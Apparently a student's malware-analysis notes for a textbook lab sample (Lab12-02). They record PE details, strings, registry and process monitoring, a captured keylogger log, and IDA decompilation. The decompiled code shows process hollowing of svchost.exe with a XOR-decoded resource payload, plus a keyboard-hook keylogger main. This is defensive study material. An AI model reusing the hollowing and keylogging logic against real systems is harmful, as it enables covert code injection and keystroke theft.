Lab12-02.exe
    PE Analysis
        # Virustotal
            60/71
            SHA-256: ae8a1c7eb64c42ea2a04f97523ebf0844c27029eb040d910048b680f884b9dce

        # PEid
            Microsoft Visual C++ 6.0

        # PEview
            TimeStamp (IMAGE_FILE_HEADER): 2011/04/08 Fri 17:54:23 UTC
            Subsystem (IMAGE_OPTIONAL_HEADER): IMAGE_SUBSYSTEM_WINDOWS_CUI (cmd)
            Sections (Virtual Size / Size of Raw Data) -> No Packed
                .text: 2E96/3000
                .rdata: 8F2/1000
                .data: 7DC/1000
                .rsrc: 6084/7000
        
        # Dependency Walker
            KERNEL32.DLL
                CloseHandle
                CreateFileA
                CreateProcessA
                ExitProcess
                FindResourceA
                FreeEnvironmentStringsA
                FreeEnvironmentStringsW
                FreeResource
                GetACP
                GetCPInfo
                GetCommandLineA
                GetCurrentProcess
                GetEnvironmentStrings
                GetEnvironmentStringsW
                GetFileSize
                GetFileType
                GetModuleFileNameA
                GetModuleHandleA
                GetOEMCP
                GetProcAddress
                GetStartupInfoA
                GetStdHandle
                GetStringTypeA
                GetStringTypeW
                GetSystemDirectoryA
                GetThreadContext
                GetVersion
                HeapAlloc
                HeapCreate
                HeapDestroy
                HeapFree
                HeapReAlloc
                LCMapStringA
                LCMapStringW
                LoadLibraryA
                LoadResource
                LockResource
                MultiByteToWideChar
                ReadFile
                ReadProcessMemory
                ResumeThread
                RtlUnwind
                SetHandleCount
                SetThreadContext
                SizeofResource
                Sleep
                TerminateProcess
                UnhandledExceptionFilter
                VirtualAlloc
                VirtualAllocEx
                VirtualFree
                WideCharToMultiByte
                WriteFile
                WriteProcessMemory

        # strings.exe (Only part of the results)
            \svchost.exe
            NtUnmapViewOfSection
            ntdll.dll
            UNICODE
            LOCALIZATION
            ABAAAEAAA
            AAAAAAA
            AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
            AAAO^
            )(2a13.&3 ,a" //.5a#$a34/a(/a
            a,.%$oLLKeAAAAAAAV
            AAAAAAAAAAAAAAAAAAAAAAAA
            @BA"
            AAAAAAAA
            AN@J@GAAqAAAqAAAAAA
            VAAAQAAA
            AAAA
            AAQAAAQAAEAAAAAAAEAAAAAAAA1AAAQAAAAAABAAAAAQAAQAAAAQAAQAAAAAAQAAAAAAAAAAAm
            AA}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
            AAAAAAAAAAAAAAAAAAAAAAAAAAAo5$95AAAwlAAAQAAAqAAAQAAAAAAAAAAAAAAaAA!o3% 5 AA
            IAAA
            AAAQAAA
            AAAAAAAAAAAAAA
            o% 5 AAA=QAAA
            AAAQAAA
            AAAAAAAAAAAAAA
            AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

        # Resource Hacker
            AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...

    Dynamic Analysis
        # RegShot (Part of results)
            ----------------------------------
            Values modified:1
            ----------------------------------
            HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed: 8B 6F 25 34 9D 99 96 BF 2E FD FD 3C C7 20 33 E9 6C 1B 16 93 90 7D BD DD 5B E3 88 CB 85 77 10 03 6F FC 0D 70 FA F9 A7 25 B1 9E 22 E2 CF 62 31 2F 1B 19 45 E1 86 C5 0A 8A B5 26 87 A5 B9 D7 DB C8 22 61 60 5E BE 40 EA 16 BB 1C 2F D7 95 3F C9 72
            HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed: 86 45 51 54 41 20 16 92 71 E8 6A 29 B0 AE BD 8F AF A8 43 21 68 1C 4C DA FF 7E DB 41 BC 4A 73 54 43 83 AA 47 FE C4 48 04 38 02 85 4E AD E1 25 B7 89 B2 9B 5F C4 45 BE 06 85 C1 CB 50 5D 04 68 25 68 69 23 88 68 7C 8D EE 88 06 A9 FE F2 B5 BF 94

        # procexp (View > Lower Pane View > DLLS / Handles)
            Lab12-02.exe
                svchost.exe                 // It is created by the Lab12-02.exe and will be an orphan process after the killed of parent process (Lab12-02.exe)
                    strings
                        Image
                            Parameters
                            System\CurrentControlSet\Services
                            nServiceMain
                            ServiceDll
                            ServiceDllUnloadOnStop
                            eventlog
                            ncacn_np
                            \PIPE\
                            DefaultRpcStackSize
                            AuthenticationCapabilities
                            ImpersonationLevel
                            AuthenticationLevel
                            CoInitializeSecurityParam
                            Software\Microsoft\Windows NT\CurrentVersion\Svchost
                            \Registry\Machine\System\CurrentControlSet\Control\SecurePipeServers\
                            VS_VERSION_INFO
                            StringFileInfo
                            CompanyName
                            Microsoft Corporation
                            FileDescription
                            Generic Host Process for Win32 Services
                            FileVersion
                            5.1.2600.5512 (xpsp.080413-2111)
                            InternalName
                            svchost.exe
                            LegalCopyright
                            Microsoft Corporation. All rights reserved.
                            OriginalFilename
                            svchost.exe
                            ProductName
                            Microsoft
                            Windows
                            Operating System
                            ProductVersion
                            VarFileInfo
                            Translation
                            !This program cannot be run in DOS mode.
                            5Rich
                            .text
                            `.data
                            .rsrc
                            ADVAPI32.dll
                            KERNEL32.dll
                            NTDLL.DLL
                            RPCRT4.dll
                            QQV
                            PWj
                            WQP
                            SvchostPushServiceGlobals
                            ServiceMain
                            Y@PVPVh
                            VWh@@
                            SVW
                            SVW3
                            PSh
                            tQj
                            VVVV
                            t6PV
                            t!VV
                            QSV3
                            ucj
                            jWX
                            Wht@
                            jdj
                            QQSVWd
                            QSV
                            u-SS
                            uLV
                            FFf
                            !FFf
                            F$Pj
                            f9>t f
                            FFf9>u
                            tof
                            tSf
                            FFf9>u
                            ShP$
                            VWh
                            QRPh
                            uRS
                            taj
                            u:Vj
                            VVj
                            PSj
                            PSSj
                            PSSj
                            unj
                            GPW
                            FFf
                            FFf
                            PWWj
                            WWj
                            SVW
                            HHt
                            jWX]
                            SVW
                            QRPhh2
                            VWj
                            VWj
                            NETAPI32.dll
                            ole32.dll
                            Netbios
                            CoInitializeEx
                            CoInitializeSecurity
                            ADVAPI32.dll
                            KERNEL32.dll
                            ntdll.dll
                            RPCRT4.dll
                            RegQueryValueExW
                            SetSecurityDescriptorDacl
                            SetEntriesInAclW
                            SetSecurityDescriptorGroup
                            SetSecurityDescriptorOwner
                            InitializeSecurityDescriptor
                            GetTokenInformation
                            OpenProcessToken
                            OpenThreadToken
                            SetServiceStatus
                            RegisterServiceCtrlHandlerW
                            RegCloseKey
                            RegOpenKeyExW
                            StartServiceCtrlDispatcherW
                            HeapFree
                            GetLastError
                            WideCharToMultiByte
                            lstrlenW
                            LocalFree
                            GetCurrentProcess
                            GetCurrentThread
                            GetProcAddress
                            LoadLibraryExW
                            LeaveCriticalSection
                            HeapAlloc
                            EnterCriticalSection
                            LCMapStringW
                            FreeLibrary
                            lstrcpyW
                            ExpandEnvironmentStringsW
                            lstrcmpiW
                            ExitProcess
                            GetCommandLineW
                            InitializeCriticalSection
                            GetProcessHeap
                            SetErrorMode
                            SetUnhandledExceptionFilter
                            RegisterWaitForSingleObject
                            InterlockedCompareExchange
                            LoadLibraryA
                            QueryPerformanceCounter
                            GetTickCount
                            GetCurrentThreadId
                            GetCurrentProcessId
                            GetSystemTimeAsFileTime
                            TerminateProcess
                            UnhandledExceptionFilter
                            LocalAlloc
                            lstrcmpW
                            DelayLoadFailureHook
                            NtQuerySecurityObject
                            RtlFreeHeap
                            NtOpenKey
                            wcscat
                            wcscpy
                            RtlAllocateHeap
                            RtlCompareUnicodeString
                            RtlInitUnicodeString
                            RtlInitializeSid
                            RtlLengthRequiredSid
                            RtlSubAuthoritySid
                            NtClose
                            RtlSubAuthorityCountSid
                            RtlGetDaclSecurityDescriptor
                            RtlQueryInformationAcl
                            RtlGetAce
                            RtlImageNtHeader
                            wcslen
                            RtlUnhandledExceptionFilter
                            RtlCopySid
                            RpcServerUnregisterIfEx
                            RpcMgmtWaitServerListen
                            RpcMgmtSetServerStackSize
                            RpcServerUnregisterIf
                            RpcServerListen
                            RpcServerUseProtseqEpW
                            RpcServerRegisterIf
                            I_RpcMapWin32Status
                            RpcMgmtStopServerListening
                            RSDS
                            svchost.pdb
                        Memory
                            jjjj
                            !This program cannot be run in DOS mode.
                            RichS
                            .text
                            `.rdata
                            @.data
                            hPS@
                            @hTP@
                            hPW@
                            hPW@
                            hPS@
                            toj
                            PhPW@
                            PhPW@
                            hPW@
                            hPS@
                            htP@
                            hxP@
                            GIu
                            GJu
                            tzVS
                            GIt%
                            t/Ku
                            GKu
                            SVW
                            YYh P@
                            VWu
                            t9UW
                            QQS3
                            VWu
                            PSSW
                            PVW
                            SS@SSPVSS
                            t#SSUP
                            t$$VSS
                            UWV
                            DSUVWh
                            SVWUj
                            SVW
                            t.;t$$t(
                            VC20XC00U
                            SVWU
                            tEVU
                            SVW
                            UAA
                            Wj@Y3
                            t7SW
                            VPj
                            VPV
                            VPh
                            ulSj
                            pD#U
                            SVW
                            NCu
                            VWuBh
                            tPh
                            SVW
                            uFWWj
                            "WWSh
                            E WW
                            tfS
                            tMWWS
                            WWu
                            VSh 
                            SVW
                            PVh
                            WSV
                            B~k!C~
                            C~+wB~
                            runtime error 
                            TLOSS error
                            SING error
                            DOMAIN error
                            - unable to initialize heap
                            - not enough space for lowio initialization
                            - not enough space for stdio initialization
                            - pure virtual function call
                            - not enough space for _onexit/atexit table
                            - unable to open console device
                            - unexpected heap error
                            - unexpected multithread lock error
                            - not enough space for thread data
                            abnormal program termination
                            - not enough space for environment
                            - not enough space for arguments
                            - floating point not loaded
                            Microsoft Visual C++ Runtime Library
                            Runtime Error!
                            Program: 
                            <program name unknown>
                            GetLastActivePopup
                            GetActiveWindow
                            MessageBoxA
                            user32.dll
                            GetModuleHandleA
                            AllocConsole
                            CloseHandle
                            WriteFile
                            SetFilePointer
                            CreateFileA
                            KERNEL32.dll
                            UnhookWindowsHookEx
                            GetMessageA
                            SetWindowsHookExA
                            ShowWindow
                            FindWindowA
                            CallNextHookEx
                            GetWindowTextA
                            GetForegroundWindow
                            USER32.dll
                            GetCommandLineA
                            GetVersion
                            ExitProcess
                            TerminateProcess
                            GetCurrentProcess
                            UnhandledExceptionFilter
                            GetModuleFileNameA
                            FreeEnvironmentStringsA
                            FreeEnvironmentStringsW
                            WideCharToMultiByte
                            GetEnvironmentStrings
                            GetEnvironmentStringsW
                            SetHandleCount
                            GetStdHandle
                            GetFileType
                            GetStartupInfoA
                            HeapDestroy
                            HeapCreate
                            VirtualFree
                            HeapFree
                            RtlUnwind
                            HeapAlloc
                            GetCPInfo
                            GetACP
                            GetOEMCP
                            VirtualAlloc
                            HeapReAlloc
                            GetProcAddress
                            LoadLibraryA
                            MultiByteToWideChar
                            LCMapStringA
                            LCMapStringW
                            GetStringTypeA
                            GetStringTypeW
                            [Window: 
                            ConsoleWindowClass
                            practicalmalwareanalysis.log                                    // !
                            [SHIFT]                                                         // !
                            [ENTER]                                                         // !
                            [BACKSPACE]                                                     // !
                            BACKSPACE
                            [TAB]                                                           // !
                            [CTRL]                                                          // !
                            [DEL]                                                           // !
                            [CAPS LOCK]                                                     // !
                            [CAPS LOCK]
                            123 - Notepad                                                   // ! I use 123 as the name of txt file to save the strings. It maybe a keylogger.
                            123 - Notepad
                            xplorer Strings...
                            C:\WINDOWS\system32\svchost.exe
                            abcdefghijklmnopqrstuvwxyz
                            ABCDEFGHIJKLMNOPQRSTUVWXYZ

        # procmon
            Filter
                Process Name is svchost.exe Include
                Operation is CreateFile Include
                Operation is WriteFile Include

            .\practicalmalwareanalysis.log                
                [Window:  ~res - Notepad]
                ac
                [Window:  Process Explorer - Sysinternals: www.sysinternals.com [MALWARE\practice]]
                
                [Window:  Process Explorer - Sysinternals: www.sysinternals.com [MALWARE\practice]]
                hh
                [Window:  rundll regshot]
                
                [Window:  rundll regshot]
                ccvvzzcc
                [Window:  Program Manager]
                
                [Window:  Program Manager]
                vv
                [Window:  Chapter_3L]
                
                [Window:  Chapter_3L]
                ccvv
                [Window:  regshot1.72]
                
                [Window:  regshot1.72]
                ww
                [Window:  Process Monitor]
                
                [Window:  Process Monitor]
                eerr
                [Window:  Program Manager]
                
                [Window:  Program Manager]
                rr
                [Window:  Run]
                c
                [Window:  Run]
                cmmdd
                [ENTER]
                [ENTER]
                [Window:  C:\WINDOWS\system32\cmd.exe]
                
                [Window:  C:\WINDOWS\system32\cmd.exe]
                ccdd  [CAPS LOCK][CAPS LOCK]dd[CAPS LOCK][CAPS LOCK]eess[TAB][TAB]
                [ENTER]
                [ENTER]rruunnddllll3322[TAB][TAB]  [CAPS LOCK][CAPS LOCK]ll[CAPS LOCK][CAPS LOCK]aa[TAB][TAB]eexx[TAB][TAB]BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  [CAPS LOCK][CAPS LOCK]ii[CAPS LOCK][CAPS LOCK]nnssttaallll[CAPS LOCK][CAPS LOCK]  aa[CAPS LOCK][CAPS LOCK]
                [ENTER]
                [ENTER]BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  [CAPS LOCK][CAPS LOCK]aa
                [ENTER]
                [ENTER]
                [Window:  RUNDLL]
                [CAPS LOCK]
                [Window:  RUNDLL]
                [CAPS LOCK]
                [Window:  ~res - Notepad]
                ac
                [Window:  svchost.exe:2176 Properties]
                
                [Window:  Save Process Explorer Strings...]
                123
                [Window:  123 - Notepad]
                acwacw
                [Window:  Chapter_3L]
                .c
                [Window:  Program Manager]
                v
                [Window:  02 Virtual Network]
                c
                [Window:  Program Manager]
                v
                [Window:  rundll regshot]
                cd
                [Window:  ]
                v
                [Window:  Process Explorer - Sysinternals: www.sysinternals.com [MALWARE\practice]]
                r
                [Window:  Run]
                cmd
                [ENTER]
                [Window:  C:\WINDOWS\system32\cmd.exe]
                cd [CAPS LOCK]d[CAPS LOCK]es[TAB]
                [ENTER]run BACKSPACE  dll[TAB]zBACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  runddl32BACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  ll32[TAB] [CAPS LOCK]l[CAPS LOCK]b[TAB]BACKSPACE  a[TAB]install[CAPS LOCK]a[CAPS LOCK]
                [ENTER]
                [ENTER]ineBACKSPACE  BACKSPACE  BACKSPACE  BACKSPACE  netsBACKSPACE   start [CAPS LOCK]iprip[CAPS LOCK]
                [ENTER]
                [Window:  net.exe:3020 Properties]
                
                [Window:  Lab12-02.exe:2456 Properties]
                
                [Window:  Lab12-02.exe:2456 Properties]
                
                [Window:  Chapter_3L]
                
                [ENTER]
                [Window:  Chapter_3L]
                
                [ENTER]
                [Window:  Save Process Explorer Strings...]
                t
                [Window:  Save Process Explorer Strings...]
                t
                [Window:  Save Process Explorer Strings...]
                thhhiiisssiiisssttteeessstttfffooorrr   BACKSPACE  BACKSPACE  BACKSPACE  kkkeeeyyyllloooggggggeeerrr
                [ENTER]
                [ENTER]
                [ENTER]
                [Window:  thisistestforkeylogger - Notepad]
                
                [Window:  thisistestforkeylogger - Notepad]
                
                [Window:  thisistestforkeylogger - Notepad]
                aaacccwww
                [Window:  Process Monitor Filter]
                [CAPS LOCK][CAPS LOCK][CAPS LOCK]l[CAPS LOCK]ab0301exeBACKSPACE  3practisaasBACKSPACE  calmawaBACKSPACE  BACKSPACE  lwareanayBACKSPACE  lysisiBACKSPACE  log[CAPS LOCK]w[CAPS LOCK]rite[CAPS LOCK]f[CAPS LOCK]ile[CAPS LOCK]r[CAPS LOCK]ead[CAPS LOCK]f[CAPS LOCK]ile
                [Window:  practicalmalwareanalysis - Everything]
                
                [Window:  practicalmalwareanalysis. - Everything]
                BACKSPACE  
                [Window:  practicalmalwareanalysis - Everything]
                
                [Window:  svchost.exe:3676 Properties]
                
                [Window:  svchost.exe:3676 Properties]
                
                [Window:  svchost.exe:3676 Properties]
                rrr
                [Window:  Run]
                n
                [Window:  Run]
                n
                [Window:  Run]
                nooottteeepppaaaddd
                [Window:  Program Manager]
                r
                [Window:  Run]
                notepad
                [ENTER]
                [Window:  Untitled - Notepad]
                this is test
                [ENTER][CAPS LOCK]h[CAPS LOCK]ello
                [ENTER][CAPS LOCK]w[CAPS LOCK]orld
                [ENTER][CAPS LOCK]i[CAPS LOCK] am a player[TAB]
                [Window:  Process Monitor Filter]
                creadBACKSPACE  BACKSPACE  ate
                [ENTER]
                [Window:  Process Monitor]
                
                [Window:  Process Monitor Filter]
                [CAPS LOCK]awBACKSPACE  BACKSPACE  w[CAPS LOCK]riteprosvchostexe
                [Window:  Process Monitor - Sysinternals: www.sysinternals.com]
                [TAB]

        # ApateDNS
            NULL

        # IDA Pro
            int __cdecl main(int argc, const char **argv, const char **envp)
            {
            if ( argc < 2 )
            {
                lpAddress = 0;
                Lab12_02_exe_handle = GetModuleHandleA(0);  // Get Current Process Handle
                Get_svchost_exe_under_systemroot(svchost_exe, &svchost_exe_proc, 0x400u);                // replace svchost.exe proc
                lpAddress = Extract_rsrc_section_of_Lab12_02_exe_xor(Lab12_02_exe_handle);              // replace with .rsrc section of Lab12-02.exe       ;if ( *v5 != 'M' || v5[1] != 'Z' )     // PE header
                if ( lpAddress )
                {
                Proc_replacement(&svchost_exe_proc, lpAddress);
                memset(&svchost_exe_proc, 0, 0x400u);
                VirtualFree(lpAddress, 0, 0x8000u);
                }
            }
            Sleep(0x3E8u);
            return 0;
            }

            int __cdecl Proc_replacement(LPCSTR svchost_exe_proc, LPCVOID lpBuffer)
            {
            v13 = lpBuffer;
            if ( *lpBuffer != 'ZM' )                      // MZ
                return 0;
            v12 = lpBuffer + v13[15];
            if ( *v12 != 'EP' )                           // PE
                return 0;
            memset(&StartupInfo, 0, 0x44u);
            memset(&ProcessInformation, 0, 0x10u);
            if ( !CreateProcessA(svchost_exe_proc, 0, 0, 0, 0, 4u, 0, 0, &StartupInfo, &ProcessInformation) )// dwCreationFlags:0x4 <- Suspend all threads till ResumeThread()
                return 0;
            lpContext = VirtualAlloc(0, 0x2CCu, 0x1000u, 4u);
            lpContext->ContextFlags = 65543;
            if ( !GetThreadContext(ProcessInformation.hThread, lpContext) )
                return 0;
            Buffer = 0;
            lpBaseAddress = 0;
            UnmapViewOfSection_func = 0;
            ReadProcessMemory(ProcessInformation.hProcess, (lpContext->Ebx + 8), &Buffer, 4u, 0);
            ntdll.dll_handle = GetModuleHandleA(ntdll_dll);
            UnmapViewOfSection_func = GetProcAddress(ntdll.dll_handle, NtUnmapViewOfSection);
            if ( !UnmapViewOfSection_func )
                return 0;
            (UnmapViewOfSection_func)(ProcessInformation.hProcess, Buffer);
            lpBaseAddress = VirtualAllocEx(ProcessInformation.hProcess, *(v12 + 13), *(v12 + 20), 0x3000u, 0x40u);
            if ( !lpBaseAddress )
                return 0;
            WriteProcessMemory(ProcessInformation.hProcess, lpBaseAddress, lpBuffer, *(v12 + 21), 0);
            for ( i = 0; i < *(v12 + 3); ++i )
            {
                v4 = lpBuffer + 40 * i + v13[15] + 248;
                WriteProcessMemory(ProcessInformation.hProcess, lpBaseAddress + v4[3], lpBuffer + v4[5], v4[4], 0);
            }
            WriteProcessMemory(ProcessInformation.hProcess, (lpContext->Ebx + 8), v12 + 52, 4u, 0);
            lpContext->Eax = lpBaseAddress + *(v12 + 10);
            SetThreadContext(ProcessInformation.hThread, lpContext);
            ResumeThread(ProcessInformation.hThread);
            return 1;
            }

            int __cdecl decode_rsrc_section(int new_space, unsigned int size, char A)
            {
            for ( i = 0; i < size; ++i )
            {
                *(i + new_space) ^= A;         // xor 'A'
                result = i + 1;
            }
            return result;
            }

        # WinHex
            Edit > Modify Data > XOR 41

RSRC.exe
    Dynamic Analysis
        # IDA Pro
            int __cdecl main(int argc, const char **argv, const char **envp)
            {
            AllocConsole();
            hWnd = FindWindowA(ClassName, 0);
            if ( hWnd )
                ShowWindow(hWnd, 0);
            memset(byte_405350, 1, 0x400u);
            v3 = GetModuleHandleA(0);
            hhk = SetWindowsHookExA(13, fn, v3, 0);                 // Hook keylogger
            while ( GetMessageA(0, 0, 0, 0) )
                ;
            return UnhookWindowsHookEx(hhk);
            }

Analysis
    This malware replace the content of process svchost.exe with the .rsrc section (encoded PE file).
    